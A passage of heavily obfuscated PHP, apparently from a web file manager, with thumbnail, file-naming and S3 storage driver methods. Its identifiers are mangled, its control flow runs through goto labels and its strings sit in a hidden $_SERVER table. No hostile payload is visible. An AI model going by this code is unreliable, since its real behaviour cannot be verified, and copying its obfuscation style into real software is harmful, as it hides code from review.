IO::mkdir(IO_PATH_SYSTEM_TEMP . $bÄÎ°÷á¸[176]); } else { $cÇŒç¼Óè‚ = KodIO::make($B½ÓöùÏ¤Â); } if ($B½ÓöùÏ¤Â = IO::fileNameExist($cÇŒç¼Óè‚, $AÃôÁ“Ù¦¡)) { $C¿¸øğ”§ = KodIO::make($B½ÓöùÏ¤Â); return IO::fileOut($C¿¸øğ”§); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto CÃ×É™Óãõ; cêùÍ‰ÛË: if ($bÒù§÷ÒĞ[$bÄÎ°÷á¸[87]] <= 1024 * 50 || !function_exists($bÄÎ°÷á¸[169]) || $bÒù§÷ÒĞ[$bÄÎ°÷á¸[170]] == $bÄÎ°÷á¸[171]) { return $this->fileOut($BæÑÏ·®Ğğ); } if (isset($bÒù§÷ÒĞ[$bÄÎ°÷á¸[172]][$bÄÎ°÷á¸[173]])) { $b°§«Ë “ = $bÒù§÷ÒĞ[$bÄÎ°÷á¸[172]][$bÄÎ°÷á¸[173]]; } else { if (isset($bÒù§÷ÒĞ[$bÄÎ°÷á¸[172]][$bÄÎ°÷á¸[174]])) { $b°§«Ë “ = $bÒù§÷ÒĞ[$bÄÎ°÷á¸[172]][$bÄÎ°÷á¸[174]]; } else { $b°§«Ë “ = md5("{$bÒù§÷ÒĞ[$bÄÎ°÷á¸[38]]}\137{$bÒù§÷ÒĞ[$bÄÎ°÷á¸[85]]}\137{$bÒù§÷ÒĞ[$bÄÎ°÷á¸[87]]}"); } } $AÃôÁ“Ù¦¡ = "{$b°§«Ë “}\137{$aãì¬ì˜}\56\160\156\147"; goto aÈƒ¢ÛÚ›; FÀ£Œ‚¯Å: $bÄÎ°÷á¸ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (substr($BæÑÏ·®Ğğ, 0, 4) == $bÄÎ°÷á¸[154]) { $this->fileOutLink($BæÑÏ·®Ğğ); } $bÒù§÷ÒĞ = $this->info($BæÑÏ·®Ğğ); goto cêùÍ‰ÛË; CÃ×É™Óãõ: $C¿¸øğ”§ = DATA_THUMB . $AÃôÁ“Ù¦¡; if (!@file_exists($C¿¸øğ”§)) { $f™ÊÅÖšÑÏ = TEMP_FILES; if (!is_dir($f™ÊÅÖšÑÏ)) { mk_dir($f™ÊÅÖšÑÏ); } $A®ßõ‚›à” = $f™ÊÅÖšÑÏ . $b°§«Ë “ . $bÄÎ°÷á¸[101] . $bÒù§÷ÒĞ[$bÄÎ°÷á¸[170]]; if (!@file_exists($A®ßõ‚›à”)) { $A®ßõ‚›à” = $this->download($BæÑÏ·®Ğğ, $A®ßõ‚›à”); } $AÑŞ¡Šçõï = new ImageThumb($A®ßõ‚›à”, $bÄÎ°÷á¸[177]); $AÑŞ¡Šçõï->prorate($C¿¸øğ”§, $aãì¬ì˜, $aãì¬ì˜ * 10); } if (!file_exists($C¿¸øğ”§) || filesize($C¿¸øğ”§) < 100) { return @file_exists($A®ßõ‚›à”) ? IO::fileOut($A®ßõ‚›à”) : $this->fileOut($BæÑÏ·®Ğğ); } goto dªëïÎƒˆ”; BãÌöÁ¤ˆ¼: } public function fileOutImageServer($E·Şø‘‰…Ê, $CùÈ£¢¯Ù = 250) { $this->fileOutImage($E·Şø‘‰…Ê, $CùÈ£¢¯Ù); } public function fileNameAuto($D’¡ß†¦ô, $BÉ¿³Î£æ¨, $EİÉò˜öš = REPEAT_RENAME, $a‹“ŠÄƒ·µ = false) { goto eäÆÇÁ¼·; AšÊ™È”³‰: while ($this->exist(rtrim($D’¡ß†¦ô, $fÍÎ™¹‚‡[18]) . $fÍÎ™¹‚‡[18] . $CÛ¦§¶Š‰š)) { $CÛ¦§¶Š‰š = $D‘ÍÜ©íº÷ . "\x28{$eò­Æº‡¢Ç}\51{$F«·øÕ„ ˆ}"; $eò­Æº‡¢Ç++; } return $CÛ¦§¶Š‰š; goto F¥ø¤ö²Ù; B„•°‡°‹¾: if ($EİÉò˜öš == REPEAT_SKIP) { return !1; } $F«·øÕ„ ˆ = $fÍÎ™¹‚‡[101] . get_path_ext($BÉ¿³Î£æ¨); $F«·øÕ„ ˆ = $F«·øÕ„ ˆ == $fÍÎ™¹‚‡[101] || $a‹“ŠÄƒ·µ ? $fÍÎ™¹‚‡[43] : $F«·øÕ„ ˆ; goto dÉ¨ãÙ„; eäÆÇÁ¼·: $fÍÎ™¹‚‡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C¶ÔçÉáÊœ = $D’¡ß†¦ô === $fÍÎ™¹‚‡[43] ? $BÉ¿³Î£æ¨ : rtrim($D’¡ß†¦ô, $fÍÎ™¹‚‡[18]) . $fÍÎ™¹‚‡[18] . $BÉ¿³Î£æ¨; if ($EİÉò˜öš == REPEAT_REPLACE || !$this->exist($C¶ÔçÉáÊœ) || $a‹“ŠÄƒ·µ && $EİÉò˜öš != REPEAT_RENAME_FOLDER) { return $BÉ¿³Î£æ¨; } goto B„•°‡°‹¾; dÉ¨ãÙ„: $eò­Æº‡¢Ç = 1; $D‘ÍÜ©íº÷ = substr($BÉ¿³Î£æ¨, 0, strlen($BÉ¿³Î£æ¨) - strlen($F«·øÕ„ ˆ)); $CÛ¦§¶Š‰š = $D‘ÍÜ©íº÷ . "\50{$eò­Æº‡¢Ç}\51{$F«·øÕ„ ˆ}"; goto AšÊ™È”³‰; F¥ø¤ö²Ù: } public function listAllFiles($B‹«¶›àñ, $aì…‘¨õùæ, $Eİõòœ…£© = array()) { goto bŠÖ‚ç‹‡’; bŞÈ¾«Š©Ê: $B‹«¶›àñ = trim($B‹«¶›àñ, $cÍß¿Ñˆ”ì[18]); foreach ($aì…‘¨õùæ as $b§ê¦÷Íàè) { $E¹©Ù¾ËÆÍ = ltrim(substr($b§ê¦÷Íàè, strlen($B‹«¶›àñ)), $cÍß¿Ñˆ”ì[18]); $aÜÙù–šºŒ = array_merge($aÜÙù–šºŒ, $this->slicePath($E¹©Ù¾ËÆÍ)); } $b°Õ·æ´¢™ = array(); goto FÃø–ØÑ; FÃø–ØÑ: foreach (array_unique($aÜÙù–šºŒ) as $b§ê¦÷Íàè) { $E„È¿µ±˜ = array($cÍß¿Ñˆ”ì[85] => $this->getPathOuter($cÍß¿Ñˆ”ì[18] . $B‹«¶›àñ . $cÍß¿Ñˆ”ì[18] . $b§ê¦÷Íàè), $cÍß¿Ñˆ”ì[86] => 1, $cÍß¿Ñˆ”ì[87] => 0); if (substr($b§ê¦÷Íàè, -1) != $cÍß¿Ñˆ”ì[18]) { $E„È¿µ±˜[$cÍß¿Ñˆ”ì[86]] = 0; $c—˜…Ÿñ÷Õ = $this->getPath($B‹«¶›àñ . $cÍß¿Ñˆ”ì[18] . $b§ê¦÷Íàè); $E„È¿µ±˜[$cÍß¿Ñˆ”ì[87]] = isset($Eİõòœ…£©[$c—˜…Ÿñ÷Õ]) ? $Eİõòœ…£©[$c—˜…Ÿñ÷Õ] : $this->size($c—˜…Ÿñ÷Õ); } $b°Õ·æ´¢™[] = $E„È¿µ±˜; } return $b°Õ·æ´¢™; goto cÜãÄ£Ÿ÷Ş; bŠÖ‚ç‹‡’: $cÍß¿Ñˆ”ì =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (empty($aì…‘¨õùæ)) { return array(); } $aÜÙù–šºŒ = array(); goto bŞÈ¾«Š©Ê; cÜãÄ£Ÿ÷Ş: } public function slicePath($aç®‹ŸÊô“) { $EÂ¾èÔ†ï =& $_SERVER[çŞáÓæÚô‚Ô‡]; $CÔó„ñÂôŠ = explode($EÂ¾èÔ†ï[18], trim($aç®‹ŸÊô“, $EÂ¾èÔ†ï[18])); $cƒÛíä¥­ = 0; do { ++$cƒÛíä¥­; $b©Õ»¾öÎ[] = implode($EÂ¾èÔ†ï[18], array_slice($CÔó„ñÂôŠ, 0, $cƒÛíä¥­)) . $EÂ¾èÔ†ï[18]; } while ($cƒÛíä¥­ < count($CÔó„ñÂôŠ)); $b©Õ»¾öÎ[count($CÔó„ñÂôŠ) - 1] = $aç®‹ŸÊô“; return $b©Õ»¾öÎ; } public function getHost() { $CÓ³İÜöÌ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f¶—˜Š“…ä = parse_url(trim($this->domain, $CÓ³İÜöÌ[18])); $DËÄ´ÈÆØ = isset($f¶—˜Š“…ä[$CÓ³İÜöÌ[178]]) ? $f¶—˜Š“…ä[$CÓ³İÜöÌ[178]] : http_type(); $Eƒó¡¢”‡¹ = isset($f¶—˜Š“…ä[$CÓ³İÜöÌ[179]]) ? $f¶—˜Š“…ä[$CÓ³İÜöÌ[179]] : $f¶—˜Š“…ä[$CÓ³İÜöÌ[85]]; if (isset($f¶—˜Š“…ä[$CÓ³İÜöÌ[180]])) { $Eƒó¡¢”‡¹ .= $CÓ³İÜöÌ[4] . $f¶—˜Š“…ä[$CÓ³İÜöÌ[180]]; } return $DËÄ´ÈÆØ . $CÓ³İÜöÌ[181] . $Eƒó¡¢”‡¹; } public function pathEncode($f÷ôÅ‹à’Ú) { $cíğÇÜåâ =& $_SERVER[çŞáÓæÚô‚Ô‡]; return str_replace($cíğÇÜåâ[182], $cíğÇÜåâ[18], rawurlencode($f÷ôÅ‹à’Ú)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($C§ğõ’¡¥) { set_timeout(); require_once SDK_DIR . $_SERVER[çŞáÓæÚô‚Ô‡][183]; parent::__construct(); $this->_init($C§ğõ’¡¥); } public function _init($e‡Ü’…ù«á) { foreach ($e‡Ü’…ù«á as $AÂÊ›î‚¶• => $eàñŞ×èøå) { if (isset($this->{$AÂÊ›î‚¶•})) { $this->{$AÂÊ›î‚¶•} = $eàñŞ×èøå; } } $this->endpoint = $e‡Ü’…ù«á[$_SERVER[çŞáÓæÚô‚Ô‡][184]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($bàóÀ‡§Ù = "\166\x34") { $this->signVer = $bàóÀ‡§Ù; $this->client->setSignatureVersion($bàóÀ‡§Ù); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto c²ÍöÅ…â; eã¯‚ĞØ™•: $c»Éñ‰¾† = array($C’…‰…¸£½[190], $C’…‰…¸£½[191], $C’…‰…¸£½[192], $C’…‰…¸£½[193], $C’…‰…¸£½[194]); $b¦…çå› = array_diff($c»Éñ‰¾†, $cƒÖ¤ê×÷ê); return empty($b¦…çå›); goto aåî®†…ë«; eîº“ñÅ†: if ($A¡×§Ó•›Ô[$C’…‰…¸£½[185]] != $C’…‰…¸£½[186] || $A¡×§Ó•›Ô[$C’…‰…¸£½[187]] != $C’…‰…¸£½[186]) { return !1; } $cƒÖ¤ê×÷ê = array_map($C’…‰…¸£½[188], $A¡×§Ó•›Ô[$C’…‰…¸£½[189]]); if (!is_array($cƒÖ¤ê×÷ê)) { $cƒÖ¤ê×÷ê = array(); } goto eã¯‚ĞØ™•; c²ÍöÅ…â: $C’…‰…¸£½ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A¡×§Ó•›Ô = $this->getBucketCors(); if (!$A¡×§Ó•›Ô || !is_array($A¡×§Ó•›Ô)) { return !1; } goto eîº“ñÅ†; aåî®†…ë«: } public function mkfile($A¬¨‹´”¹ï, $CĞò‰³æÒÔ = '', $E„ÄŒ«’‚¢ = REPEAT_RENAME) { $D½é©×¹ø® = $this->setContent($A¬¨‹´”¹ï, $CĞò‰³æÒÔ); if ($D½é©×¹ø® !== !1) { return $this->getPathOuter($A¬¨‹´”¹ï); } return !1; } public function mkdir($D± ÙÄ™½Ş, $C‹ĞŠ½Ğ© = REPEAT_SKIP) { if (empty($D± ÙÄ™½Ş)) { return !1; } if ($this->_isFolder($D± ÙÄ™½Ş)) { return $this->getPathOuter($D± ÙÄ™½Ş); } $c‘ä¨©Ú¸“ = $this->setContent($D± ÙÄ™½Ş, $_SERVER[çŞáÓæÚô‚Ô‡][43], !0); if ($c‘ä¨©Ú¸“ !== !1) { return $this->getPathOuter($D± ÙÄ™½Ş); } return !1; } public function copyFile($aöİÑî¦±ñ, $CµàôÉ ·¬, $B³„ß ºõµ = array()) { $a‡µ¸Ş“Š =& $_SERVER[çŞáÓæÚô‚Ô‡]; $céš¿÷ï×Ğ = $this->objectMeta($aöİÑî¦±ñ); if (!$céš¿÷ï×Ğ) { return !1; } if ($céš¿÷ï×Ğ[$a‡µ¸Ş“Š[87]] <= 1024 * 1024 * 200) { $eÈ„÷ßÎ¿“ = $this->client->copyObject($this->bucket, $aöİÑî¦±ñ, $this->bucket, $CµàôÉ ·¬, $a‡µ¸Ş“Š[195], $B³„ß ºõµ); } else { $eÈ„÷ßÎ¿“ = $this->client->multiCopyObject($this->bucket, $aöİÑî¦±ñ, $this->bucket, $CµàôÉ ·¬, $B³„ß ºõµ); } $eÈ„÷ßÎ¿“ = $eÈ„÷ßÎ¿“ ? $this->getPathOuter($CµàôÉ ·¬) : !1; return $eÈ„÷ßÎ¿“; } public function moveFile($cè‘ï“šŒ¿, $f‚Î¹ËÔœø) { if ($this->copyFile($cè‘ï“šŒ¿, $f‚Î¹ËÔœø)) { $this->delFile($cè‘ï“šŒ¿); return $this->getPathOuter($f‚Î¹ËÔœø); } return !1; } public function delFile($fÇè¤‚°È¨) { return $this->client->deleteObject($this->bucket, $fÇè¤‚°È¨); } public function delFolder($dì¨ÈãêŸ) { goto C®™Ê¶åØ; fŒÜôÀÓÄ–: return $aîâÛÃ‰Â === $f‡³øß²Å‚ ? !0 : !1; goto EĞœ­¦îÙø; Aİ¤¸…°´µ: $aîâÛÃ‰Â = $f‡³øß²Å‚ = 0; $bòôÖìö¼ = array_chunk(array_keys($E à²Œ’ñÒ), 1000); foreach ($bòôÖìö¼ as $DËá„Ä¯Ç‡) { $aîâÛÃ‰Â++; $f‡³øß²Å‚ += (int) $this->client->deleteObjects($this->bucket, $DËá„Ä¯Ç‡); } goto fŒÜôÀÓÄ–; C®™Ê¶åØ: $Eè«î±õàñ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E à²Œ’ñÒ = $this->listObjs($dì¨ÈãêŸ); if (!$E à²Œ’ñÒ) { $dì¨ÈãêŸ = trim($dì¨ÈãêŸ, $Eè«î±õàñ[18]); if (!empty($dì¨ÈãêŸ)) { $dì¨ÈãêŸ .= $Eè«î±õàñ[18]; } return $this->delFile($dì¨ÈãêŸ); } goto Aİ¤¸…°´µ; EĞœ­¦îÙø: } public function rename($f¥‚ë§çä, $b¡¹ƒÓ¸”ˆ) { return $this->renameObject($f¥‚ë§çä, $b¡¹ƒÓ¸”ˆ); } public function listPath($Eòª¸ïÏêë, $CÃ˜åŸ‹ÉÃ = false) { $d…Ê×Œïí =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f‰…×™Òœğ = $this->listObjs($Eòª¸ïÏêë, null, null, $d…Ê×Œïí[18]); $C¤Ø‚ˆÀÄ– = array($d…Ê×Œïí[84] => array(), $d…Ê×Œïí[83] => array()); foreach ($f‰…×™Òœğ as $b„Ê•¹”’ => $c‡•íæĞâŠ) { if ($b„Ê•¹”’ == $d…Ê×Œïí[18]) { continue; } if (isset($c‡•íæĞâŠ[$d…Ê×Œïí[196]])) { $C¤Ø‚ˆÀÄ–[$d…Ê×Œïí[84]][] = $this->folderInfo($c‡•íæĞâŠ[$d…Ê×Œïí[196]], $CÃ˜åŸ‹ÉÃ); } else { if (substr($c‡•íæĞâŠ[$d…Ê×Œïí[38]], -1) == $d…Ê×Œïí[18]) { continue; } $C¤Ø‚ˆÀÄ–[$d…Ê×Œïí[83]][] = $this->fileInfo($c‡•íæĞâŠ[$d…Ê×Œïí[38]], $CÃ˜åŸ‹ÉÃ, $c‡•íæĞâŠ); } } return $C¤Ø‚ˆÀÄ–; } private function fileInfo($a»ß–šØ­, $B¸ê×©éÅ‰ = false, $Bì›¨¤²Ø = array()) { goto B›ˆ‡¹´İ; F’®ˆÍÂˆÓ: if (empty($Bì›¨¤²Ø)) { $Bì›¨¤²Ø = $this->objectMeta($a»ß–šØ­); if (!$Bì›¨¤²Ø) { return $dÚôØÍ•»; } } if (isset($Bì›¨¤²Ø[$Cã± ¼¥—‘[200]])) { $dÚôØÍ•»[$Cã± ¼¥—‘[117]] = $Bì›¨¤²Ø[$Cã± ¼¥—‘[200]]; } if (isset($Bì›¨¤²Ø[$Cã± ¼¥—‘[87]])) { $dÚôØÍ•»[$Cã± ¼¥—‘[87]] = $Bì›¨¤²Ø[$Cã± ¼¥—‘[87]]; } goto FÅŠÁóã˜; FÅŠÁóã˜: return $dÚôØÍ•»; goto dõ¯×œš™; B›ˆ‡¹´İ: $Cã± ¼¥—‘ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($B¸ê×©éÅ‰) { return array($Cã± ¼¥—‘[38] => $this->pathThis($a»ß–šØ­), $Cã± ¼¥—‘[85] => $this->getPathOuter($a»ß–šØ­), $Cã± ¼¥—‘[39] => $Cã± ¼¥—‘[177], $Cã± ¼¥—‘[170] => $this->ext($a»ß–šØ­), $Cã± ¼¥—‘[87] => isset($Bì›¨¤²Ø[$Cã± ¼¥—‘[87]]) ? $Bì›¨¤²Ø[$Cã± ¼¥—‘[87]] : 0, $Cã± ¼¥—‘[197] => 0, $Cã± ¼¥—‘[117] => 0, $Cã± ¼¥—‘[198] => !0, $Cã± ¼¥—‘[199] => !0); } $dÚôØÍ•» = array($Cã± ¼¥—‘[38] => $this->pathThis($a»ß–šØ­), $Cã± ¼¥—‘[85] => $this->getPathOuter($a»ß–šØ­), $Cã± ¼¥—‘[39] => $Cã± ¼¥—‘[177], $Cã± ¼¥—‘[197] => 0, $Cã± ¼¥—‘[117] => 0, $Cã± ¼¥—‘[87] => 0, $Cã± ¼¥—‘[170] => $this->ext($a»ß–šØ­), $Cã± ¼¥—‘[198] => !0, $Cã± ¼¥—‘[199] => !0); goto F’®ˆÍÂˆÓ; dõ¯×œš™: } private function folderInfo($FÚÔŒÑäÊ, $FŒŸ•¡¬¼ = false) { goto aĞ Çˆì’‰; F¬¡ù±—­: if (isset($Då˜—ÄËØ…[$CëÛ§¼ÚÜ¢[200]])) { $D÷ëŸ’µŠë[$CëÛ§¼ÚÜ¢[197]] = $Då˜—ÄËØ…[$CëÛ§¼ÚÜ¢[200]]; } return $D÷ëŸ’µŠë; goto bˆÎ’àª½æ; B…¦‚†Ìêõ: if ($FÚÔŒÑäÊ == $CëÛ§¼ÚÜ¢[43]) { return $D÷ëŸ’µŠë; } $FÚÔŒÑäÊ = trim($FÚÔŒÑäÊ, $CëÛ§¼ÚÜ¢[18]) . $CëÛ§¼ÚÜ¢[18]; $Då˜—ÄËØ… = $this->objectMeta($FÚÔŒÑäÊ); goto F¬¡ù±—­; aĞ Çˆì’‰: $CëÛ§¼ÚÜ¢ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($FŒŸ•¡¬¼) { return array($CëÛ§¼ÚÜ¢[38] => $this->pathThis($FÚÔŒÑäÊ), $CëÛ§¼ÚÜ¢[85] => $this->getPathOuter($CëÛ§¼ÚÜ¢[18] . $FÚÔŒÑäÊ), $CëÛ§¼ÚÜ¢[39] => $CëÛ§¼ÚÜ¢[86], $CëÛ§¼ÚÜ¢[198] => !0, $CëÛ§¼ÚÜ¢[199] => !0); } $D÷ëŸ’µŠë = array($CëÛ§¼ÚÜ¢[38] => $this->pathThis($FÚÔŒÑäÊ), $CëÛ§¼ÚÜ¢[85] => $this->getPathOuter($CëÛ§¼ÚÜ¢[18] . $FÚÔŒÑäÊ), $CëÛ§¼ÚÜ¢[39] => $CëÛ§¼ÚÜ¢[86], $CëÛ§¼ÚÜ¢[197] => 0, $CëÛ§¼ÚÜ¢[117] => 0, $CëÛ§¼ÚÜ¢[198] => !0, $CëÛ§¼ÚÜ¢[199] => !0); goto B…¦‚†Ìêõ; bˆÎ’àª½æ: } public function listObjs($EºÛ”ãÈğÔ, $bñÁ¤ƒÚõ = null, $d¤Æ¢Şàì¹ = null, $a„§Âáßˆ = null) { $C™ŠÚèÒøŠ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EºÛ”ãÈğÔ = trim($EºÛ”ãÈğÔ, $C™ŠÚèÒøŠ[18]); $CÙĞë‰×Ã² = empty($EºÛ”ãÈğÔ) ? $C™ŠÚèÒøŠ[43] : $EºÛ”ãÈğÔ . $C™ŠÚèÒøŠ[18]; return $this->client->getBucket($this->bucket, $CÙĞë‰×Ã², $bñÁ¤ƒÚõ, $d¤Æ¢Şàì¹, $a„§Âáßˆ, !0); } public function has($DŞ†ƒ«ÅÎÅ, $Bƒ¥ªœÀ¸ = false, $Fñ»¦½çæ = true) { goto A“ĞÓò‚‡¶; eöØøçõí‰: if ($Bƒ¥ªœÀ¸) { return array($eÎ¿ğÈ³‚[201] => $c‡ÆÔà¿·â, $eÎ¿ğÈ³‚[202] => $dó™†Äé÷í); } return !1; goto cÜ«ùª×Ø; A“ĞÓò‚‡¶: $eÎ¿ğÈ³‚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $c‡ÆÔà¿·â = 0; $dó™†Äé÷í = 0; goto cˆƒ‡ÊªõÙ; cˆƒ‡ÊªõÙ: $EÈ´‰Ô¤¦ = $this->listObjs($DŞ†ƒ«ÅÎÅ, null, null, $eÎ¿ğÈ³‚[18]); $EÈ´‰Ô¤¦ = is_array($EÈ´‰Ô¤¦) ? $EÈ´‰Ô¤¦ : array(); foreach ($EÈ´‰Ô¤¦ as $FòŞ¤İáÏ÷) { if (isset($FòŞ¤İáÏ÷[$eÎ¿ğÈ³‚[38]]) && substr($FòŞ¤İáÏ÷[$eÎ¿ğÈ³‚[38]], -1) != $eÎ¿ğÈ³‚[18]) { if (!$Bƒ¥ªœÀ¸ && $Fñ»¦½çæ) { return !0; } $c‡ÆÔà¿·â++; } else { if (isset($FòŞ¤İáÏ÷[$eÎ¿ğÈ³‚[196]])) { if (!$Bƒ¥ªœÀ¸ && !$Fñ»¦½çæ) { return !1; } $dó™†Äé÷í++; } } } goto eöØøçõí‰; cÜ«ùª×Ø: } public function listAll($bÅ•é…ó) { $B“À¡•êîª =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bÀåäòÉí² = $this->listObjs($bÅ•é…ó); $e°Ûé¨„Ò¨ = $E†‚à½Ì¸ = array(); foreach ($bÀåäòÉí² as $EÊİì“ ¨ => $D¹íŒ›ÎÙö) { $e°Ûé¨„Ò¨[] = $D¹íŒ›ÎÙö[$B“À¡•êîª[38]]; $E†‚à½Ì¸[$EÊİì“ ¨] = $D¹íŒ›ÎÙö[$B“À¡•êîª[87]]; } return $this->listAllFiles($bÅ•é…ó, $e°Ûé¨„Ò¨, $E†‚à½Ì¸); } public function canRead($eÆù ¸µ„Ì) { $Eë¯‚ºæ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eŒ„ŒÄ•š = $this->client->getAccessControlPolicy($this->bucket, $eÆù ¸µ„Ì); if (!$eŒ„ŒÄ•š) { return !1; } return in_array($eŒ„ŒÄ•š, array($Eë¯‚ºæ[203], $Eë¯‚ºæ[204], $Eë¯‚ºæ[205])) ? !0 : !1; } public function canWrite($EÑå×‹Ò†Ê) { $f¸«ù­ÅË‹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EÕ‹£‘Œó = $this->client->getAccessControlPolicy($this->bucket, $EÑå×‹Ò†Ê); if (!$EÕ‹£‘Œó) { return !1; } return in_array($EÕ‹£‘Œó, array($f¸«ù­ÅË‹[203], $f¸«ù­ÅË‹[204])) ? !0 : !1; } public function getContent($F°ÃãÚ«) { return $this->client->getObject($this->bucket, $F°ÃãÚ«); } public function setContent($eèÉİó÷Ğª, $d»ò…ŒÃ„ = '', $d§ùÂ¡¨ = false) { goto F˜¡ó–øô‹; AŞõñ«ÊŸë: $this->cacheMethod(null, null); $bò•ˆ¹ğÖ÷ = $this->copyFile($eèÉİó÷Ğª, $eèÉİó÷Ğª, array($b‰âÜ­‡˜œ[206] => $bò•ˆ¹ğÖ÷[$b‰âÜ­‡˜œ[207]])); return $bò•ˆ¹ğÖ÷ ? !0 : !1; goto e…ÅÕ”›÷¡; F˜¡ó–øô‹: $b‰âÜ­‡˜œ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eèÉİó÷Ğª = $d§ùÂ¡¨ ? trim($eèÉİó÷Ğª, $b‰âÜ­‡˜œ[18]) . $b‰âÜ­‡˜œ[18] : $eèÉİó÷Ğª; $e¾Ä¤Ñ©ÔÉ = get_file_mime(get_path_ext($eèÉİó÷Ğª)); goto a”ÀŸñÙìÏ; a”ÀŸñÙìÏ: $bò•ˆ¹ğÖ÷ = $this->client->putObject($d»ò…ŒÃ„, $this->bucket, $eèÉİó÷Ğª, $b‰âÜ­‡˜œ[195], array(), $e¾Ä¤Ñ©ÔÉ); if (!$bò•ˆ¹ğÖ÷) { return !1; } if ($d§ùÂ¡¨) { return !0; } goto AŞõñ«ÊŸë; e…ÅÕ”›÷¡: } public function fileSubstr($EğŞ²ŸÖí, $a÷®´œŞ×Î, $aŠÌÙÔğ£) { $aí‘Ä¯œ‘ = $a÷®´œŞ×Î + $aŠÌÙÔğ£ - 1; return $this->client->getObject($this->bucket, $EğŞ²ŸÖí, array($_SERVER[çŞáÓæÚô‚Ô‡][208] => "\142\171\x74\145\163\x3d{$a÷®´œŞ×Î}\x2d{$aí‘Ä¯œ‘}")); } public function upload($a•Î´ ‘Õ, $A›ÃùİÑğƒ, $a‘ÜàÅä©° = false, $fá¹©ôå‡ = REPEAT_REPLACE) { $Eè§†âÜÆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Bï‚á¨¿š = array($Eè§†âÜÆ[206] => @md5_file($A›ÃùİÑğƒ)); $bãÊèí»”æ = array($Eè§†âÜÆ[209] => get_file_mime(get_path_ext($a•Î´ ‘Õ))); if (IO::size($A›ÃùİÑğƒ) <= 1024 * 1024 * 200) { $eƒ±©§îô = $this->client->putObjectFile($A›ÃùİÑğƒ, $this->bucket, $a•Î´ ‘Õ, $Eè§†âÜÆ[195], $Bï‚á¨¿š, $bãÊèí»”æ); return !empty($eƒ±©§îô) ? $this->getPathOuter($a•Î´ ‘Õ) : !1; } $fÛù¿î»Ş± = $this->client->multiUploadObject($A›ÃùİÑğƒ, $this->bucket, trim($a•Î´ ‘Õ, $Eè§†âÜÆ[18]), $Bï‚á¨¿š, $bãÊèí»”æ); return $fÛù¿î»Ş± ? $this->getPathOuter($a•Î´ ‘Õ) : !1; } public function download($FÒ¤±ù°‹Æ, $Cä°òÃíò) { if (!@is_dir($this->pathFather($Cä°òÃíò)) && !IO::mkdir($this->pathFather($Cä°òÃíò))) { return !1; } $dãõø¬İÊ  = $this->client->getObject($this->bucket, $FÒ¤±ù°‹Æ, array(), $Cä°òÃíò); return $dãõø¬İÊ  !== !1 ? $Cä°òÃíò : !1; } public function link($FŠ‚•˜¶‰ñ, $cŒ©“ƒÈ‚ó = array()) { $fáò…Ü§‚Œ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($this->signVer == $fáò…Ü§‚Œ[210]) { return $this->client->getAuthenticatedURL($this->bucket, $FŠ‚•˜¶‰ñ, 3600 * 12, $cŒ©“ƒÈ‚ó); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($FŠ‚•˜¶‰ñ, $fáò…Ü§‚Œ[18]), 3600 * 12, $this->region, array(), !0, $cŒ©“ƒÈ‚ó); } public function fileOut($fÒ¤›æõæ, $f™ø¬ˆé”– = false, $Eˆââ°Š¹µ = false, $F£ŒÚâª¸« = '') { goto bŸ¢ªïÀÊ“; fŒ…Î²°’†: $DááÉ¯Ñ = get_file_mime(get_path_ext($Eˆââ°Š¹µ)); if ($DááÉ¯Ñ == $F¼ÌÛÂî[211]) { return parent::fileOut($fÒ¤›æõæ, $f™ø¬ˆé”–, $Eˆââ°Š¹µ, $F£ŒÚâª¸«); } $f™ø¬ˆé”– = $f™ø¬ˆé”– ? $F¼ÌÛÂî[212] : $F¼ÌÛÂî[213]; goto d†¿óŠøÌ‚; d†¿óŠøÌ‚: $e÷ÓÖ’³š† = array($F¼ÌÛÂî[214] => $f™ø¬ˆé”– . $F¼ÌÛÂî[215] . rawurlencode($Eˆââ°Š¹µ), $F¼ÌÛÂî[216] => $DááÉ¯Ñ); $dê¤ÙÃ¡Å = $this->link($fÒ¤›æõæ, $e÷ÓÖ’³š†); $this->fileOutLink($dê¤ÙÃ¡Å); goto Eâİ¨åƒ¿; bŸ¢ªïÀÊ“: $F¼ÌÛÂî =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($this->isFileOutServer()) { return $this->fileOutServer($fÒ¤›æõæ, $f™ø¬ˆé”–, $Eˆââ°Š¹µ, $F£ŒÚâª¸«); } if (!$Eˆââ°Š¹µ) { $Eˆââ°Š¹µ = $this->pathThis($fÒ¤›æõæ); } goto fŒ…Î²°’†; Eâİ¨åƒ¿: } public function fileOutServer($D‡ï¾òøœç, $aï¯Ş•¯†í = false, $E·ª³æ´°İ = false, $aíš˜µÌ– = '') { parent::fileOut($D‡ï¾òøœç, $aï¯Ş•¯†í, $E·ª³æ´°İ, $aíš˜µÌ–); } public function fileOutImageServer($a¹¡÷÷‰Ç†, $F»Â‘Ÿ®Úß = 250) { parent::fileOutImage($a¹¡÷÷‰Ç†, $F»Â‘Ÿ®Úß); } public function hashMd5($E¢˜£à‘Íğ, 